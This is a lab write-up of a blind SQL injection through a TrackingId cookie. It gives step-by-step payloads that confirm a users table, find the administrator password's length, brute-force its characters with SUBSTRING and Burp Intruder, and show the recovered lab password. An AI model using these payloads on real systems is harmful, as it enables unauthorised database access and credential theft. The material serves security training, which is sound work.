## Lab Description :

![image]()

## Solution :


Request looks like 

![image]()


Query made looks something like -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```
where trackingID - `g2w1yAddN9LlERl3` Cookievalue - `xdpiZNiyUyxtsAfDKlsfxYJldM3xW576`

TrackingID parameter is vulnerable. This is a blind SQL injection since response is not diplayed back. 

We can perform a SQL  injection on trackingID parameter , 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
```

there maybe 2 results - TrackinID does/does not exist.

- Condition(1=1) = **TRUE** -> **Welcome back message is shown**

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
```

![image]()


- Condition(1=2) = **FALSE** -> **Welcome back message is not shown**

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '
```

![image]()


From the above responses, we can we can exploit the blind injection vulnerablitiy .

#### Conform that there is users table -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --
```

```
This SQL statement is checking whether the result of a subquery, which selects the string 'x' from the users table with a limit of 1, is equal to the string 'x'. The use of the AND operator indicates that this condition must be true for the overall query to return any results

If users table  is there, then the condition return x . It checks if returned 'x' = 'x'. Now condition is TRUE. So it conforms that users table is present.
```

![image]()

We see a *Welcome back* msg , so it conforms that there is a users table.

#### Conform that username administrator is present in users table -

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

![image]()

We confirm that there is a user called `administrator` in the database.

#### Find the length password of administrator 

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

In particular, the subquery `(SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)` is attempting to retrieve the username of the administrator account whose password is longer than one character. If such an account exists in the database, the subquery will return the value "administrator".

The outer part of the string `AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'` is then attempting to compare this value to the string literal 'administrator'. If the subquery returns the value 'administrator', then the entire expression will evaluate to true.

![image]()

This confirms that the password is greater than 1

If we send the value as  50 ie `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>50)='a`  , we dont get any welcome message which means its not > 50  characters.

![image]()

Automate this -> 

1. Send request to Intruder
2. Add the password length part [> 1] 
3. Attack type - SNIPER
4. Payload type - Numbers
5. Give number range from 1-50

There is a difference in length at number 20, means that while checking `if length(password) > 20` it FAILS.

So the total **length of password is 20**.

#### Bruteforce the 20 character length password


Use the same query as above bu thios time we use the  **SUBSTRING** method `(SELECT SUBSTRING(password,1,1)` to get each letter of the password and loop through it  to check if 1st letter is =a/b/c ... & so on.

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)>1 )='a'--
```
From the above command we take the 1st character of the password & check if it is = 'a'.
Check until the condition returns TRUE. Meaning the first character of password = letter/number at the right.

Automate this  -

1. Attack type - Cluster bomb
2. Payload 1 - length checking part [>1]
3. Payload 2 - character checking part ['a'--]
4. Payload 1 type - Numbers [range 1-20]
5. Payload 2 type - Bruteforcer [min & max length = 1]


In the filter settings, add the search item as `Welcome`

![image]()

Now we get 20 differnt payloads which give us the **Welcome back** option.

![image]()

Araange the payload number and write the payload2 alphabets (password characters) in order .

So the password is - `92fvq10oaxi0vjhxk7yw`


![image]()


